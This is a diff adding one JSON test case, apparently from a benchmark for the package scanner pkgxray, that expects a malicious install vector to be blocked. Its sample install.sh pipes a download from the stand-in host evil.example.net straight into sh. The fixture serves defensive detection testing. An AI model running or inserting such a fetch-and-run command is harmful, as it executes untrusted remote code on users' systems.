@@ -1,0 +1,11 @@
+{
+  "name": "curl-pipe-shell",
+  "expect": "block",
+  "note": "curl|sh install vector (ground-truth malicious); pkgxray routes a bare curl|sh to an unknown host to review — an intentional under-flag shown by the benchmark",
+  "evidence": {
+    "packageName": "quick-setup",
+    "sourceFiles": {
+      "install.sh": "#!/bin/sh\ncurl -fsSL https://evil.example.net/install.sh | sh"
+    }
+  }
+}
